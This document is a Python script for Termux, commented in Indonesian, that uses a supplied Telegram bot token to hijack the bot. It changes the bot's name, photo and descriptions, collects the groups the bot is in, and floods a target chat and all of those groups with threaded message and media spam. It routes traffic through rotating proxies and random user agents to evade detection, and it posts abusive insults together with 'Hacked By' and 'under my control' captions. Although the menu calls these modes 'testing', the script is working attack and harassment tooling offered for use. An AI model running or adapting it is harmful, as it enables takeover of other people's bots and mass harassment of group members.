#!/usr/bin/env python3
import os
import random
import requests
import time 
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
import tempfile 
import shutil   

# Batas maksimum karakter per pesan di Telegram API
MAX_TELEGRAM_MESSAGE_LENGTH = 4096 
# Jeda antar potongan pesan (dalam detik)
CHUNK_DELAY = 0.5 

# ==================== WEAPONIZED CONTENT FACTORY ====================
class ChaosFactory:
    def __init__(self):
        self.ua = UserAgent()
        self.media_db = self._init_media_database()
        self.text_templates = [
            "⚠️ YOUR BOT IS NOW UNDER MY CONTROL (Pikri) ⚠",
            "⚠️ YOUR BOT IS NOW UNDER MY CONTROL (Pikri) ⚠",
            "⚠️ YOUR BOT IS NOW UNDER MY CONTROL (Pikri) ⚠"
        ]
        
    def _init_media_database(self):
        return {
            'gifs': [
                "https://media.giphy.com/media/XUFPGrX5Zis6Y/giphy.gif",
                "https://media.giphy.com/media/3o7abAHdYv77BNNGAC/giphy.gif"
            ],
            'videos': [
                "http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4",
                "http://techslides.com/demos/sample-videos/small.mp4"
            ],
            'stickers': [
                "CAACAgIAAxkBAAIBQGWfLnlSJvDxJq9xQb9fBkfW5JFuAAJEAANSiZEj7wAB_SbQnDzSLwQ",
                "CAACAgIAAxkBAAIBQWWfLn0AAUf5xJN_7Vb7XyH7Kt3sRgACQgADUomRI6Q8AAFXSSu-0y8E"
            ],
            'documents': [
                ("https://www.africau.edu/images/default/sample.pdf", "sample.pdf"), 
                ("http://www.pdf995.com/samples/pdf.pdf", "report.pdf") 
            ]
        }

    def generate_placeholder_text(self):
        return random.choice(["Langkah mitigasi", "Protokol enkripsi", "Firewall diaktifkan"])

    def generate_killer_text(self, counter):
        template = random.choice(self.text_templates)
        return template.format(
            counter=counter, 
            time=random.randint(1, 10), 
            code=f"{random.randint(100,999)}", 
            placeholder=self.generate_placeholder_text()
        )

# ==================== TACTICAL NUKE LAUNCHER ====================
class TermuxAnnihilator:
    def __init__(self):
        self.factory = ChaosFactory()
        self.session = requests.Session()
        self.proxies = self._init_proxy_pool()
        self.counter = 0
        
        # Daftar grup default (seharusnya diisi saat runtime, tapi ini untuk contoh)
        self.group_list = []

    def _init_proxy_pool(self):
        return [
            "socks5://localhost:9050",
            "http://45.77.56.102:3128",
            "http://51.158.68.68:8811"
        ]

    def _get_random_proxy(self):
        return {"http": random.choice(self.proxies)} if random.random() > 0.7 else None
    
    def _send_telegram_payload(self, endpoint, payload):
        headers = {
            "User-Agent": self.factory.ua.random,
            "X-Custom-Header": str(random.randint(100000,999999))
        }
        chat_id = payload.get('chat_id', 'N/A') # Tambahkan default N/A
        try:
            response = self.session.post(
                endpoint,
                json=payload,
                headers=headers,
                proxies=self._get_random_proxy(),
                timeout=5
            )
            
            # Ubah logika pengembalian agar selalu mengembalikan tuple (Sukses, Chat ID, Deskripsi/None)
            if response.status_code == 200 and response.json().get('ok'):
                return True, chat_id, None # Sukses
            else:
                # Coba ambil deskripsi error dari JSON, jika tidak ada, gunakan status code
                error_desc = response.json().get('description', f'Status code {response.status_code}')
                return False, chat_id, error_desc # Gagal

        except requests.exceptions.RequestException as e:
            return False, chat_id, str(e) # Gagal karena Request Exception
        except Exception as e:
            # Ini menangani kasus di mana response.json() gagal (misalnya, body kosong)
            return False, chat_id, f"Kesalahan Umum: {str(e)}"
    
    def set_bot_name(self, token, new_name):
        # Batas Nama Bot adalah 1-255 karakter
        if not (1 <= len(new_name) <= 255):
             print(f"❌ Nama bot harus antara 1 sampai 255 karakter. Anda memasukkan {len(new_name)}.")
             return False

        endpoint = f"https://api.telegram.org/bot{token}/setMyName"
        # Untuk setMyName, kita hanya perlu tahu apakah berhasil atau tidak
        response_tuple = self._send_telegram_payload(endpoint, {"name": new_name})
        
        if response_tuple[0]: # Cek elemen pertama (True/False)
            return True
        else:
            error_desc = response_tuple[2] # Ambil deskripsi error
            print(f"❌ Gagal set Nama Bot: {error_desc}")
            return False

    def set_bot_description(self, token, description):
        endpoint = f"https://api.telegram.org/bot{token}/setMyDescription"
        response_tuple = self._send_telegram_payload(endpoint, {"description": description})
        
        return response_tuple[0]
        
    def set_bot_short_description(self, token, short_description):
        # Batas Bio/Short Description adalah 0-120 karakter
        if len(short_description) > 120:
             print(f"❌ Bio terlalu panjang. Maksimal 120 karakter. Anda memasukkan {len(short_description)}.")
             return False

        endpoint = f"https://api.telegram.org/bot{token}/setMyShortDescription"
        response_tuple = self._send_telegram_payload(endpoint, {"short_description": short_description})
        
        return response_tuple[0]

    def set_bot_profile_photo(self, token, photo_source):
        # Logika ini menggunakan requests.post files= yang berbeda, 
        # sehingga tidak dapat menggunakan _send_telegram_payload yang berbasis JSON.
        temp_file_path = None
        
        try:
            if photo_source.startswith(('http://', 'https://')):
                print("⏳ Mengunduh foto dari URL...")
                response = requests.get(photo_source, stream=True, timeout=60)
                response.raise_for_status() 
                
                temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
                temp_file_path = temp_file.name
                with open(temp_file_path, 'wb') as f:
                    shutil.copyfileobj(response.raw, f)
                photo_path = temp_file_path
                print(f"✅ Foto berhasil diunduh ke file sementara.")
            
            else:
                photo_path = photo_source
                if not os.path.exists(photo_path):
                    print(f"❌ ERROR: File foto lokal tidak ditemukan di jalur: {photo_path}")
                    return False
                
            endpoint = f"https://api.telegram.org/bot{token}/setMyProfilePhoto"
            
            with open(photo_path, 'rb') as photo_file:
                files = {'photo': photo_file}
                response = requests.post(
                    endpoint, 
                    files=files, 
                    proxies=self._get_random_proxy(), 
                    timeout=10
                )

            if response.status_code == 200 and response.json().get('ok'):
                return True
            else:
                error_desc = response.json().get('description', 'Gagal, status code non-200')
                print(f"❌ Gagal set PP: {error_desc}")
                return False

        except requests.exceptions.HTTPError as e:
            print(f"❌ ERROR HTTP saat mengunduh: Cek URL Anda ({e.response.status_code})")
            return False
        except Exception as e:
            print(f"❌ Error umum: {e}")
            return False
        finally:
            if temp_file_path and os.path.exists(temp_file_path):
                os.remove(temp_file_path)

    def _send_chunked_or_repetitive_message(self, token, chat_id, full_message, repeat_count):
        endpoint = f"https://api.telegram.org/bot{token}/sendMessage"
        
        if repeat_count > 1:
            success_count = 0
            for i in range(1, repeat_count + 1):
                prefix = f"Pesan #{i}/{repeat_count}:\n"
                max_msg_len = MAX_TELEGRAM_MESSAGE_LENGTH - len(prefix)
                message_text = prefix + full_message[:max_msg_len]
                
                payload = {
                    "chat_id": chat_id,
                    "text": message_text,
                    "parse_mode": "HTML"
                }
                
                # Menggunakan _send_telegram_payload, yang sekarang mengembalikan tuple konsisten
                result_tuple = self._send_telegram_payload(endpoint, payload)
                
                if result_tuple[0]:
                    success_count += 1
                    time.sleep(CHUNK_DELAY) 
                else:
                    error_desc = result_tuple[2]
                    return False, chat_id, f"Gagal pada pesan #{i}: {error_desc}"
            
            return True, chat_id
        
        else:
            message_chunks = [
                full_message[i:i + MAX_TELEGRAM_MESSAGE_LENGTH] 
                for i in range(0, len(full_message), MAX_TELEGRAM_MESSAGE_LENGTH)
            ]
            
            success_count = 0
            for i, chunk in enumerate(message_chunks):
                payload = {
                    "chat_id": chat_id,
                    "text": chunk,
                    "parse_mode": "HTML"
                }
                
                # Menggunakan _send_telegram_payload
                result_tuple = self._send_telegram_payload(endpoint, payload)
                
                if result_tuple[0]:
                    success_count += 1
                    time.sleep(CHUNK_DELAY)
                else:
                    error_desc = result_tuple[2]
                    return False, chat_id, error_desc 

            return True, chat_id

    def broadcast_message(self, token, message, repeat_count):
        if repeat_count > 1:
            print(f"\n📢 Memulai broadcast {repeat_count}x pesan ke {len(self.group_list)} grup...")
        else:
            print(f"\n📢 Memulai broadcast pesan (chat sekaligus) ke {len(self.group_list)} grup...")

        sent_count = 0
        failed_count = 0
        
        with ThreadPoolExecutor(max_workers=20) as executor: 
            futures = []
            for chat_id in self.group_list:
                futures.append(
                    executor.submit(
                        self._send_chunked_or_repetitive_message,
                        token,
                        chat_id,
                        message,
                        repeat_count
                    )
                )

            for future in as_completed(futures):
                result = future.result()
                if result and result[0]:
                    sent_count += 1
                elif result:
                    failed_count += 1
                    chat_id = result[1]
                    error_info = result[2]
                    print(f"❌ Gagal kirim ke ID {chat_id}: {error_info}")
        
        print(f"\n✅ Broadcast Selesai. Grup Sukses: {sent_count} | Grup Gagal: {failed_count}")

    def get_bot_info(self, token):
        endpoint = f"https://api.telegram.org/bot{token}/getMe"
        # Gunakan _send_telegram_payload. Karena endpoint ini BUKAN sendMessage,
        # ia akan mengembalikan (False, 'N/A', Error/None) atau (True, 'N/A', None)
        response_tuple = self._send_telegram_payload(endpoint, {}) 
        
        if response_tuple[0]:
            # Ambil detail bot dengan request baru karena _send_telegram_payload 
            # hanya mengembalikan status, bukan body JSON.
            try:
                response = requests.get(endpoint, timeout=5)
                data = response.json().get('result', {})
                return data.get('username', 'Tidak diketahui'), data.get('first_name', 'Bot')
            except Exception:
                return None, None # Gagal parse
        return None, None

    def text_armageddon(self, token, chat_id, count):
        endpoint = f"https://api.telegram.org/bot{token}/sendMessage"
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for i in range(1, count + 1):  
                futures.append(
                    executor.submit(
                        self._send_telegram_payload,
                        endpoint,
                        {
                            "chat_id": chat_id,
                            "text": self.factory.generate_killer_text(i),
                            "parse_mode": "HTML"
                        }
                    )
                )

            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result and result[0]:
                    print(f"✅ Pesan Uji Coba #{i} terkirim.")
                    os.system('termux-vibrate -d 50')

    def multi_vector_attack(self, token, chat_id, count):
        endpoints = {
            'photo': f"https://api.telegram.org/bot{token}/sendPhoto",
            'video': f"https://api.telegram.org/bot{token}/sendVideo",
            'sticker': f"https://api.telegram.org/bot{token}/sendSticker",
            'document': f"https://api.telegram.org/bot{token}/sendDocument"
        }

        for i in range(1, count+1):
            attack_type = random.choice(list(endpoints.keys()))
            payload = {"chat_id": chat_id}

            if attack_type == 'sticker':
                payload['sticker'] = random.choice(self.factory.media_db['stickers'])
            elif attack_type == 'document':
                doc_url, doc_name = random.choice(self.factory.media_db['documents'])
                payload['document'] = doc_url
                payload['caption'] = f"PHISING Ampas Yatim Tolol Miskin.\nHacked By @pikrifuckyou"
            else:
                media_url = random.choice(
                    self.factory.media_db['gifs'] if attack_type == 'photo'
                    else self.factory.media_db['videos']
                )
                payload[attack_type] = media_url
                payload['caption'] = f"PHISING Ampas Yatim Tolol Miskin.\nHacked By @pikrifuckyou"

            # result sekarang adalah tuple (True/False, chat_id, error_info)
            result = self._send_telegram_payload(endpoints[attack_type], payload)
            
            # Memproses result sebagai tuple, memperbaiki error 'Response' object is not subscriptable
            if result and result[0]:
                print(f"📦 Media Uji Coba {attack_type.upper()} #{i} terkirim.")
                os.system(f'termux-notification -t "TEST" -c "{attack_type} test launched"')
            else:
                error_info = result[2] if result and len(result) > 2 else "Unknown Error"
                print(f"❌ Gagal kirim Media Uji Coba {attack_type.upper()} #{i}: {error_info}")


    def display_group_list(self):
        if not self.group_list:
            print("⚠️ Daftar grup kosong. Tambahkan ID grup di `self.group_list` atau gunakan Opsi 11.")
            return

        print("\n--- DAFTAR GRUP TERTARGET ---")
        for i, group_id in enumerate(self.group_list, 1):
            print(f"[{i}] ID: {group_id}")
        print(f"Total: {len(self.group_list)} grup terdaftar.")

    def find_new_groups(self, token):
        endpoint = f"https://api.telegram.org/bot{token}/getUpdates"
        payload = {"limit": 100, "offset": 0} 
        
        try:
            response = requests.get(endpoint, json=payload, timeout=5)
            if response.status_code != 200:
                print("❌ Gagal mendapatkan update. Token mungkin salah.")
                return 0

            updates = response.json().get('result', [])
            new_groups_found = 0
            
            for update in updates:
                chat = None
                if 'message' in update:
                    chat = update['message'].get('chat')
                elif 'edited_message' in update:
                    chat = update['edited_message'].get('chat')

                if chat and chat.get('type') in ['group', 'supergroup']:
                    chat_id = str(chat['id'])
                    
                    if chat_id not in self.group_list:
                        self.group_list.append(chat_id)
                        new_groups_found += 1
                        
            return new_groups_found
        except Exception as e:
            print(f"Terjadi kesalahan saat mencari grup: {e}")
            return 0


# ==================== TACTICAL DEPLOYMENT ====================

def clear_console():
    """Membersihkan konsol/terminal."""
    os.system('cls' if os.name == 'nt' else 'clear')


if __name__ == "__main__":
    annihilator = TermuxAnnihilator()

    clear_console()
    print(r"""
    ████████╗███████╗███████╗████████╗
    ╚══█╔══█║██╔════╝██╔════╝╚══█╔══█║
       █║  █║█████╗  █████╗     █║  █║
       █║  █║██╔══╝  ██╔══╝     █║  █║
       █║  █║███████╗███████╗   █║  █║
       ╚═╝ ╚═╝╚══════╝╚══════╝   ╚═╝ ╚═╝
    """)

    token = input("🤖 MASUKKAN BOT TOKEN: ").strip()
    chat_id = input("💬 MASUKKAN CHAT ID TARGET (Grup/User): ").strip()
    
    # Pengecekan bot info
    username, bot_name = annihilator.get_bot_info(token) 
    print(f"🎉 Bot Terhubung! Nama: {bot_name} | Username: @{username}")


    while True:
        clear_console()
        try:
            print("\n-------------------------------------------")
            print(f"🔑 BOT AKTIF: {token[:4]}... \n 🎯 CHAT ID TARGET: {chat_id} \n 📡 Bot Terhubung! Nama: {bot_name} \n 📝 Username: @{username}")
            print(f"👥 TOTAL GRUP TERTARGET: {len(annihilator.group_list)}") 
            print("🔬 PILIH MODE PENGUJIAN:")
            print("   1. Pengujian Pesan (Pesan berulang ke ID Target)")
            print("   2. Pengujian Multi-Media (Media ke ID Target)")
            print("   3. Pengujian Gabungan (Kombinasi ke ID Target)")
            print("-------------------------------------------")
            print("⚙️ KELOLA BOT & DAFTAR GRUP:")
            print("   4. UBAH FOTO PROFIL (PP) BOT (URL/File Lokal)")
            print("   5. UBAH DESKRIPSI (DESK) BOT")
            print("   6. UBAH BIO BOT (Short Description, maks 120 kar)")
            print("   7. UBAH NAMA BOT")
            print("   8. UBAH CHAT ID TARGET")
            print("   9. BROADCAST PESAN (Panjang / Repetitif) ke SEMUA GRUP")
            print("   10. TAMPILKAN DAFTAR GRUP TERTARGET")
            print("   11. CARI & TAMBAH GRUP BARU")
            print("   12. UBAH BOT TOKEN") # <--- LAKUKAN RESET DI OPSI INI
            print("   0. KELUAR dari Program")

            mode_input = input("🛠️ PILIHAN (0-12): ")
            
            if mode_input == '0':
                clear_console()
                print("👋 Keluar dari program. Sampai jumpa!")
                os.system('termux-toast "PROGRAM SELESAI"')
                break
            
            if mode_input == '4':
                photo_source = input("📸 MASUKKAN URL FOTO (cth: https://..jpg) atau JALUR FILE LOKAL: ").strip()
                if annihilator.set_bot_profile_photo(token, photo_source):
                    print("✅ Foto Profil Bot berhasil diubah!")
                else:
                    print("❌ Gagal mengubah Foto Profil Bot. Cek URL/jalur file dan izin bot.")
                input("Tekan ENTER untuk kembali ke menu...")
                continue

            if mode_input == '5':
                description = input("📝 MASUKKAN DESKRIPSI BOT BARU (maks 512 kar): ").strip()
                if annihilator.set_bot_description(token, description):
                    print("✅ Deskripsi Bot berhasil diubah!")
                else:
                    print("❌ Gagal mengubah Deskripsi Bot. Cek Token Bot.")
                input("Tekan ENTER untuk kembali ke menu...")
                continue
            
            if mode_input == '6':
                short_description = input("🧬 MASUKKAN BIO BOT BARU (maks 120 kar): ").strip()
                if annihilator.set_bot_short_description(token, short_description):
                    print("✅ Bio Bot (Short Description) berhasil diubah!")
                else:
                    print("❌ Gagal mengubah Bio Bot. Cek Token Bot dan batas karakter.")
                input("Tekan ENTER untuk kembali ke menu...")
                continue
            
            if mode_input == '7': 
                new_name = input("✍️ MASUKKAN NAMA BOT BARU (1-255 karakter): ").strip()
                if annihilator.set_bot_name(token, new_name):
                    username, bot_name = annihilator.get_bot_info(token) 
                    print(f"✅ Nama Bot berhasil diubah menjadi: {bot_name}!")
                else:
                    print("❌ Gagal mengubah Nama Bot. Cek Token dan batasan karakter.")
                input("Tekan ENTER untuk kembali ke menu...")
                continue

            if mode_input == '8':
                print("\n--- UBAH CHAT ID TARGET ---")
                chat_id = input("💬 MASUKKAN CHAT ID TARGET BARU (Grup/User): ").strip()
                print("✅ Chat ID Target berhasil diubah!")
                input("Tekan ENTER untuk kembali ke menu...")
                continue
            
            if mode_input == '9':
                if not annihilator.group_list:
                    print("⚠️ Daftar grup kosong. Tidak dapat melakukan broadcast. Gunakan Opsi 11 untuk mencari grup.")
                    input("Tekan ENTER untuk kembali ke menu...")
                    continue
                
                print("\n--- BROADCAST PESAN (Repetitif/Panjang) ---")
                print("📝 MASUKKAN PESAN BROADCAST (Ketik pesan Anda dan tekan ENTER dua kali untuk selesai):")
                message_lines = []
                while True:
                    line = input()
                    if not line:
                        break
                    message_lines.append(line)
                message = "\n".join(message_lines)
                
                if not message.strip():
                     print("⚠️ Pesan kosong, broadcast dibatalkan.")
                     input("Tekan ENTER untuk kembali ke menu...")
                     continue

                try:
                    repeat_count = int(input("🔢 MASUKKAN JUMLAH PENGULANGAN PESAN (1 = Pesan Panjang/Chunked, >1 = Pesan Berulang. Contoh: 10): "))
                    if repeat_count < 1:
                        print("❌ Jumlah pengulangan harus 1 atau lebih.")
                        input("Tekan ENTER untuk kembali ke menu...")
                        continue
                except ValueError:
                    print("❌ Input jumlah tidak valid. Masukkan angka.")
                    input("Tekan ENTER untuk kembali ke menu...")
                    continue
                
                start_time = time.time()
                annihilator.broadcast_message(token, message, repeat_count)
                print(f"✅ Broadcast Selesai dalam {time.time()-start_time:.2f} DETIK")
                os.system('termux-toast "BROADCAST COMPLETE"')
                input("Tekan ENTER untuk kembali ke menu...")
                continue

            if mode_input == '10': 
                annihilator.display_group_list()
                input("Tekan ENTER untuk kembali ke menu...")
                continue

            if mode_input == '11': 
                print("🔎 Mencari grup baru dari 100 interaksi terakhir...")
                start_time = time.time()
                groups_added = annihilator.find_new_groups(token)
                print(f"✅ Selesai dalam {time.time()-start_time:.2f} detik.")
                
                if groups_added > 0:
                    print(f"🎉 Berhasil menambahkan {groups_added} grup baru!")
                else:
                    print("👍 Tidak ada grup baru yang ditemukan atau ditambahkan. Pastikan bot Anda memiliki interaksi baru di grup target.")
                
                print(f"👥 TOTAL GRUP TERTARGET SAAT INI: {len(annihilator.group_list)}")
                input("Tekan ENTER untuk kembali ke menu...")
                continue
            
            if mode_input == '12': # <--- LOGIKA UBAH TOKEN & RESET GRUP
                print("\n--- UBAH BOT TOKEN ---")
                new_token = input("🤖 MASUKKAN BOT TOKEN BARU: ").strip()
                
                # 1. Coba verifikasi token baru
                username, bot_name = annihilator.get_bot_info(new_token)
                
                if username and bot_name:
                    # 2. Jika token valid, ganti token
                    token = new_token
                    print("✅ Token berhasil diubah!")
                    print(f"🎉 Bot Terhubung! Nama: {bot_name} | Username: @{username}")
                    
                    # 3. RESET DAFTAR GRUP LAMA
                    old_group_count = len(annihilator.group_list)
                    annihilator.group_list = []
                    print(f"🔄 Daftar grup lama ({old_group_count} grup) telah direset.")
                    print("Silakan gunakan Opsi 11 (CARI & TAMBAH GRUP BARU) untuk bot baru.")
                else:
                    print("❌ Gagal verifikasi Bot Token baru. Token mungkin salah atau tidak aktif.")
                    
                input("Tekan ENTER untuk kembali ke menu...")
                continue


            # Logika untuk Mode Pengujian 1, 2, 3 (ke SATU CHAT ID TARGET)
            mode = int(mode_input)
            
            if mode not in [1, 2, 3]:
                print("❌ Pilihan mode tidak valid. Coba lagi.")
                input("Tekan ENTER untuk kembali ke menu...")
                continue

            count = int(input("🔢 JUMLAH PESAN/MEDIA UJI COBA: "))

            start_time = time.time()
            if mode == 1:
                annihilator.text_armageddon(token, chat_id, count)
            elif mode == 2:
                annihilator.multi_vector_attack(token, chat_id, count)
            elif mode == 3:
                half_count = max(1, count // 2)
                annihilator.text_armageddon(token, chat_id, half_count)
                annihilator.multi_vector_attack(token, chat_id, half_count)
            
            print(f"\n✅ PENGUJIAN SELESAI dalam {time.time()-start_time:.2f} DETIK")
            os.system('termux-toast "TEST COMPLETE. Kembali ke menu..."')
            input("Tekan ENTER untuk kembali ke menu...")

        except ValueError:
            print("❌ Input tidak valid. Pastikan Anda memasukkan angka.")
            input("Tekan ENTER untuk kembali ke menu...")
        except KeyboardInterrupt:
            clear_console()
            print("\n👋 Keluar dari program. Sampai jumpa!")
            os.system('termux-toast "PROGRAM SELESAI"')
            break
        except Exception as e:
            print(f"Terjadi kesalahan tak terduga: {e}")
            input("Tekan ENTER untuk kembali ke menu...")
            time.sleep(1)
